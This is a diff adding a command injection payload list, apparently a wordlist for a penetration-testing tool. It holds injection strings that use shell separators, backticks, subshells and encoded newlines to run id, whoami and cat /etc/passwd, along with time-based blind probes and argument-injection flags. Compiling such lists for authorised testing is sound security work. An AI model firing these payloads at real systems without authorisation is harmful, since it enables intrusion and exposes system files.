@@ -1,0 +1,34 @@
+# Command Injection Payloads
+# Semicolon separator
+; id
+; whoami
+; cat /etc/passwd
+# Pipe
+| id
+| whoami
+| cat /etc/passwd
+# AND operator
+&& id
+&& whoami
+# OR operator
+|| id
+|| whoami
+# Backtick
+`id`
+`whoami`
+# Dollar subshell
+$(id)
+$(whoami)
+# Newline injection
+%0aid
+%0awhoami
+# Blind — time-based
+; sleep 5
+| sleep 5
+`sleep 5`
+$(sleep 5)
+& ping -c 5 127.0.0.1 &
+# Argument injection
+--help
+-version
+--output=/tmp/pencheff_test
